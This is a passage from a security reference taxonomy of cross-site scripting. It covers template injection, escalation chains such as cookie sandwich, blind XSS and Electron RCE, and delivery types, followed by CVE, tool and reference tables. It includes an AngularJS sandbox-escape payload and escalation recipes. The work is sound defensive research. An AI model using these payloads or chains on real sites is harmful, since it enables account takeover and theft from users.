**Mechanism:** Server-Side Template Injection (SSTI) in a template engine that renders HTML for browser delivery produces a reflected XSS effect when the injected payload produces `<script>` or event handler output, even if the primary SSTI impact would be RCE. Template engines (Handlebars, Nunjucks, EJS) that allow `{{{ }}}` (unescaped triple braces) render raw HTML and are direct XSS sinks for unsanitized data.

---

### §10-5 Client-Side Template Injection (CSTI)

**Mechanism:** When a client-side template engine (AngularJS 1.x, Vue.js with runtime compiler, Handlebars in browser) receives user input that is processed by the template engine's expression evaluator, the engine's sandbox can be escaped (§5-4) or the template may directly evaluate JavaScript expressions.

**Example:** Input `{{constructor.constructor('alert(1)')()}}` in an AngularJS 1.x context.

---

### §10-6 SSR/CSR Sanitization Responsibility Gap

**Mechanism:** Applications mixing server-side rendering (SSR) with client-side hydration create ambiguity about which layer is responsible for sanitization. SSR frameworks using `isomorphic-dompurify` introduce a server-side HTML parser (jsdom) that may parse differently from the browser, creating parser differential risk (§2). Content that appears sanitized server-side may mutate during client-side hydration.

---

## §11 — Privilege Escalation Chains

XSS is rarely an endpoint. These are the structural patterns by which a limited XSS is escalated to a more severe impact.

### §11-1 Self-XSS → Account Takeover

**Mechanism:** Self-XSS (execution only in the attacker's own session) is escalated to affect other users by chaining with an additional primitive. Common escalation vectors include:
- **Login/Logout CSRF:** Force victim to log in as attacker; stored payload executes in victim's session.
- **Cache Poisoning:** Attacker triggers cache entry with their self-XSS payload; subsequent victims receive the poisoned cached response.
- **Cookie taint via open redirect:** Attacker forces a cookie containing the XSS payload to be set on the victim's browser domain.

---

### §11-2 Blind XSS

**Mechanism:** The XSS payload is stored in a location (form submission, feedback field, log entry, ticket description) that is only rendered in an administrative back-end, support dashboard, or internal tool. The attacker cannot observe execution directly but monitors callback infrastructure (XSS Hunter, import-based callbacks, DNS lookups) for delayed execution signals.

**Impact:** Because blind XSS fires in privileged internal contexts — admin dashboards, CRM interfaces, internal logging tools — the available actions (cookie theft, admin credential access, lateral movement) are far more severe than standard reflected XSS. Bug bounties exceeding $250,000 have been reported for systematic blind XSS campaigns.

---

### §11-3 XSS → HttpOnly Cookie Bypass (Cookie Sandwich)

**Mechanism:** HttpOnly cookies are inaccessible to `document.cookie` in JavaScript. However, if an attacker can use XSS to set cookies with specific formatting (leveraging RFC 2109's quoted-string cookie syntax: `$Version=1`, `param1="`, `param2=`, `param3="`), the server's legacy-compliant cookie parser interprets the surrounding cookies as quoting delimiters, "sandwiching" the HttpOnly cookie's value into an accessible cookie position. The server echoes this accessible cookie value into the HTTP response, where it becomes readable via XSS. (PortSwigger Research, Cookie Sandwich technique, January 2025.)

**Condition:** Server runs Apache Tomcat 8.5.x/9.0.x/10.0.x with RFC 2109 support; the application reflects some cookie value in its response body.

---

### §11-4 XSS → CSRF Token Theft → Full Account Takeover

**Mechanism:** Even when session cookies are HttpOnly, CSRF tokens are often stored in accessible locations: non-HttpOnly cookies, `localStorage`, or embedded in page HTML. XSS can extract the CSRF token and use it to perform state-changing actions (email change, password change) on the victim's behalf, achieving full account takeover without directly accessing the session cookie.

---

### §11-5 XSS in Electron Apps → Remote Code Execution

**Mechanism:** Electron applications bundle Chromium with Node.js. When `nodeIntegration: true` is set in `webPreferences`, JavaScript executing in the renderer process has full access to Node.js APIs (`require`, `child_process`, `fs`). An XSS in the application renderer thus achieves native OS code execution.

Even with `nodeIntegration: false`, if `contextIsolation: false` is also set, renderer JavaScript can interfere with preload scripts that have Node.js access, indirectly reaching Node.js primitives. Additionally, insecure preload scripts may expose dangerous IPC channels that XSS can invoke.

**CVE-2024-4367 (PDF.js) chain:** A crafted PDF triggers PDF.js XSS → in an Electron app with `nodeIntegration: true`, this escalates to OS-level RCE.

---

### §11-6 SSO Gadget: Self-XSS → ATO

**Mechanism:** OAuth/OIDC implementations often have mechanisms for "login as user" or for reflecting state across domains. A self-XSS can be weaponized via SSO by using the SSO flow to make the victim's browser interact with the vulnerable endpoint as the victim, executing the stored XSS payload in the victim's session context.

---

### §11-7 XSS → SSRF (via Grafana Image Renderer chain)

**Mechanism:** Applications with XSS vulnerabilities that also host the Grafana Image Renderer plugin expose an additional SSRF escalation path. The XSS (CVE-2025-4123) triggers in the Grafana frontend, which then abuses the Image Renderer plugin to make server-side HTTP requests to cloud metadata endpoints (169.254.169.254) or internal services. This converts a client-side XSS into a server-side SSRF.

---

## §12 — Delivery & Persistence Mutations

How XSS payloads reach the victim determines detectability, interaction requirements, and scope of impact.

### §12-1 Reflected XSS

**Mechanism:** The payload is included in a request (URL parameter, POST body, HTTP header) and immediately reflected in the server's response without persistence. Requires social engineering to deliver the crafted URL to the victim. Traditional and most common XSS type; easily detected by URL inspection tools.

**Variants:**
- **URL parameter reflection** — most common
- **HTTP header reflection** — `Referer`, `User-Agent`, `X-Forwarded-For`, `Origin` headers reflected in error pages or logs
- **HTTP response splitting → XSS** — CRLF injection in headers to inject new `Content-Type` or full response pages

---

### §12-2 Stored (Persistent) XSS

**Mechanism:** The payload is saved server-side (database, file system, log) and rendered to any user who views the affected page. No URL delivery required; any user visiting the page is affected. Higher severity and broader impact than reflected.

**High-value stored XSS targets:**
- Profile fields (displayed to all users viewing the profile)
- Comments and forum posts (displayed to all readers)
- Product names, chat messages, ticket fields
- Admin-facing stored XSS (becomes blind XSS — §11-2)

---

### §12-3 DOM-Based XSS

**Mechanism:** Both source and sink are in the client-side JavaScript; the server never processes the payload. The malicious data flows from a DOM source (`location.hash`, `location.search`, `localStorage`, `document.referrer`) to a DOM sink (`innerHTML`, `eval()`, `document.write()`). Server-side detection/filtering is ineffective; only client-side analysis reveals the vulnerability.

---

### §12-4 Universal/Stored DOM XSS

**Mechanism:** A hybrid: the XSS payload is stored on the server but only executed via client-side DOM operations, not by server-side reflection. The stored data is fetched via API and assigned to a DOM sink. Combines the persistence of stored XSS with the client-only execution path of DOM XSS.

---

### §12-5 Mutation-Deferred Delivery (Blind XSS as Stored)

**Mechanism:** A stored blind XSS payload is placed in a location that only renders in a backend or administrative context at some future time. The attacker deploys callbacks (§11-2) and waits. Payloads can remain dormant for days, weeks, or months before triggering. Tracking is essential; `import()` function-based callbacks (rather than `alert()`) provide async notification.

---

### §12-6 Cookie-Injection-Based Stored XSS

**Mechanism:** A value stored in a browser cookie is later reflected into the HTML response without sanitization. An attacker who can set a cookie on the victim's browser (via subdomain cookie injection, login CSRF, or the victim running the attacker's code in a self-XSS scenario) can achieve stored XSS that persists until the cookie expires.

---

### §12-7 Content-Type Confusion → XSS

**Mechanism:** An endpoint that returns user-controlled content without a restrictive `Content-Type` header, or that can be coerced into returning `text/html`, allows XSS. Techniques include: requesting a JSON endpoint with an `Accept: text/html` header that the server honors, uploading a file whose MIME type is incorrectly sniffed, or exploiting content-type override mechanisms.

---

## CVE / Bounty Mapping Table

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §9-1 PDF renderer XSS + §11-5 Electron RCE | CVE-2024-4367 (PDF.js / Firefox) | Firefox 126 patched; Electron apps → RCE; widely embedded in thousands of applications |
| §2-6 DOMPurify template literal regex bypass | CVE-2025-26791 (DOMPurify < 3.2.4) | XSS via SVG `<desc>` mutation; affects all apps using vulnerable DOMPurify version |
| §7 CSP bypass (CSPT open-redirect) + §1 reflected XSS | CVE-2025-4123 (Grafana) | High severity; $X,XXX bounty via bug bounty program; chains to §11-7 SSRF via Image Renderer |
| §6-1 postMessage wildcard + §4-1 innerHTML sink | CVE-2024-49038 (Microsoft Copilot Studio) | CVSS 9.3; cross-tenant XSS; patched via removing wildcard origin |
| §5-2 DOM clobbering gadget | CVE-2024-47068 (Rollup bundler) | Any app bundled with Rollup affected; widespread via build tooling |
| §2-1 mXSS namespace + §9-2 sanitizer bypass | DOMPurify bypass (multiple versions 2019–2025) | Fastmail bounty $250–$750; Proton Mail XSS (disclosed); Pulsar Electron app (fixed v1.128) |
| §10-3 Next.js SSR data / JSON embedding | CVE-2024-34351 (Next.js < 14.1.1) | Blind SSRF via Host header; escalatable to internal data exposure |
| §8-1 CSPT → XSS + §8-3 WAF encoding bypass | Multiple Mattermost CVEs (CVE-2023-45316, CVE-2023-6458) | CSPT2CSRF; POST/GET sinks; Rocket.Chat also affected |
| §12-2 Stored XSS + §11-5 Electron mXSS | CVE-2025-47943 (Gogs via PDF.js 1.4.20) | Stored XSS in PDF preview; affects Gogs ≤ 0.13.2 |
| §11-2 Blind XSS (systematic) | Bug bounty campaigns (Bugcrowd/HackerOne) | Rewards exceeding $250,000 reported for systematic blind XSS; individual reports $5,000–$25,000+ for privileged admin panel access |
| §5-1 Prototype pollution + §7 CSP gadget bypass | HackerOne report (S1r1us, ~$4,000) | Self-XSS → ATO via SAML; prototype pollution source in analytics → Google Tag Manager gadget |
| §3-2 Unicode NFKD normalization | Joomla PHP mbstring functions (2024) | Multiple XSS via mbstring inconsistencies; nominated PortSwigger Top 10 2024 |

---

## Detection Tool Matrix

| Tool | Target Scope | Core Technique |
|------|-------------|----------------|
| **Dalfox** (offensive) | Reflected, stored, DOM XSS; blind XSS with callback | Parameter analysis, context-aware payload injection, multi-threaded scanning; CI/CD pipeline integration |
| **XSStrike** (offensive) | Reflected XSS, DOM XSS; WAF detection and bypass | Four custom parsers (HTML, JS, CSS, fuzzer); context-specific payload generation; intelligent fuzzing engine |
| **Burp Suite Pro** (offensive/defensive) | All XSS types; full request/response analysis | Active scanner; DOM Invader for prototype pollution and clobbering; manual repeater |
| **DOM Invader** (research) | Client-side prototype pollution, DOM clobbering, postMessage | Browser-integrated canary injection; gadget scanning; automatic prototype pollution source/gadget identification |
| **XSS Hunter / XSSHunterPro** (offensive) | Blind XSS specifically | Hosted polyglot payload callback platform; tracks execution context, cookies, DOM content |
| **Nuclei + XSS templates** (offensive) | Template-based scanning for known CVE patterns | YAML template engine; rapid scanning across large target sets; community-maintained CVE templates |
| **DOMPurify** (defensive) | mXSS prevention; HTML sanitization | Parse-serialize loop with allowlist; actively maintained against namespace confusion bypasses |
| **CSPTBurpExtension** (offensive/research) | Client-Side Path Traversal sources and sinks | Passive proxy history analysis; reflected-in-path detection; sink enumeration |
| **Posta / PMHook** (research) | postMessage vulnerabilities | Message event listener logging; cross-document messaging analysis |
| **CSP Evaluator** (defensive) | CSP policy analysis | Static analysis of CSP directives for common misconfigurations (wildcards, unsafe-inline, JSONP endpoints) |
| **mXSS Tool** (research) | Mutation XSS payload testing | Browser-based DOM mutation visualization; before/after sanitizer comparison |
| **Electronegativity** (research) | Electron app XSS → RCE surface | Static analysis of Electron app configurations; identifies nodeIntegration, contextIsolation, sandbox settings |

---

## Summary: Core Principles

**What makes this mutation space possible:** The browser is a universal document renderer that must achieve backward compatibility across decades of loosely-specified HTML. This requires enormous tolerance for malformed markup, multiple competing namespace parsing rules (HTML, SVG, MathML), and context-dependent interpretation of the same bytes. Simultaneously, web applications accept input from untrusted sources and embed that input into documents processed by this maximally-tolerant renderer. The gap between "what a filter thinks a document means" and "what the browser ultimately renders" is the entire XSS attack surface. Every category in this taxonomy exploits a specific facet of that gap.

**Why incremental fixes fail:** XSS defenses are inherently reactive. Encoding libraries must be updated for every newly discovered context. Sanitizers must be patched for every newly discovered parser differential (mXSS). CSP bypasses are discovered continuously as new JSONP endpoints emerge on whitelisted domains. Prototype pollution gadgets persist in third-party libraries that applications cannot fully control. Supply chain attacks compromise dependencies between security audits. Each patch closes a specific known vector while the underlying problem — a renderer that will execute any JavaScript it encounters — remains unchanged.

**What a structural solution looks like:** The industry is converging on several structural approaches: (1) The **Sanitizer API** — a browser-native sanitizer that eliminates the parse-serialize-parse differential that enables mXSS, because sanitization and rendering occur in the same engine; (2) **Trusted Types** — a browser enforcement mechanism that restricts which code paths may create HTML strings for injection into the DOM, making XSS sinks statically auditable; (3) **strict-dynamic CSP** — a CSP mode that removes host-based allowlists and instead trusts only nonce-carrying scripts and their transitive dependencies, eliminating JSONP/open-redirect bypasses; (4) **framework-level defaults** — modern frameworks like React and Vue that make the safe path the default, with escape hatches explicitly named as dangerous. No single mechanism is sufficient; defense-in-depth combining all four, alongside supply chain monitoring and continuous security testing, is required.

---

## References

### Academic & Conference Research
- Heiderich, M. et al. "mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations." CCS 2013.
- Lekies, S. et al. "25 Million Flows Later: Large-Scale Detection of DOM-based XSS." CCS 2013.
- Soroush, D. "Client-Side Path Traversal." OWASP/PortSwigger Research, 2022.
- Schmitt, M. "Exploiting Client-Side Path Traversal — CSRF is Dead, Long Live CSRF." OWASP Global AppSec Lisbon, 2024.
- Mizu, K. "Exploring the DOMPurify Library: Bypasses and Fixes." Insomnihack 2024. [PortSwigger Top 10 Web Hacking Techniques 2024, #1 in mXSS category]
- Orange Tsai & splitline. "WorstFit: Unveiling Hidden Transformers in Windows ANSI." 2024. [Unicode normalization XSS; PortSwigger Top 10 2024]
- Rinsma, T. "CVE-2024-4367 — Arbitrary JavaScript Execution in PDF.js." Codean Labs, May 2024.
- Fedotkin, Z. "Stealing HttpOnly Cookies with the Cookie Sandwich Technique." PortSwigger Research, January 2025.

### CVE Sources
- CVE-2024-4367 (PDF.js) — NVD / Codean Labs advisory
- CVE-2025-26791 (DOMPurify < 3.2.4) — GitHub Advisory / NVD
- CVE-2025-4123 (Grafana XSS/Open Redirect) — Grafana Security Blog
- CVE-2024-49038 (Microsoft Copilot Studio postMessage) — MSRC
- CVE-2024-47068 (Rollup DOM clobbering) — GitHub Advisories
- CVE-2024-6783 (Vue 2 template compiler XSS) — NVD
- CVE-2024-34351 (Next.js SSRF) — Assetnote / NVD
- CVE-2023-45316, CVE-2023-6458 (Mattermost CSPT2CSRF) — Doyensec / NVD

### Practitioner Resources
- PortSwigger Web Security Academy — XSS, DOM Invader, Prototype Pollution, postMessage labs
- PortSwigger Research. "Top 10 Web Hacking Techniques of 2024." February 2025.
- PortSwigger Research. "Widespread Prototype Pollution Gadgets." October 2022.
- Securitum (Bentkowski, M.). "Mutation XSS via Namespace Confusion." September 2020.
- Sonar. "mXSS: The Vulnerability Hiding in Your Code." May 2024.
- Doyensec. "Modern Alchemy: Turning XSS into RCE." 2017; "Subverting Electron Apps via Insecure Preload." BlackHat Asia 2019.
- Flatt Security. "Bypassing DOMPurify with Good Old XML." April 2024.
- Bugcrowd. "The Guide to Blind XSS: Advanced Techniques for Bug Bounty Hunters Worth $250,000." October 2025.
- Intigriti. "Content Security Policy (CSP) Bypasses." December 2025.
- PayloadsAllTheThings — XSS Filter Bypass, Client-Side Path Traversal sections.

### Tools
- Dalfox: https://github.com/hahwul/dalfox
- XSStrike: https://github.com/s0md3v/XSStrike
- DOMPurify: https://github.com/cure53/DOMPurify
- CSPTBurpExtension: https://github.com/PortSwigger/client-side-path-traversal-exploitation
- XSS Hunter Pro: https://github.com/mandatoryprogrammer/xsshunter-express
- Electronegativity: https://github.com/doyensec/electronegativity

---

*This document was created for defensive security research and vulnerability understanding purposes.*
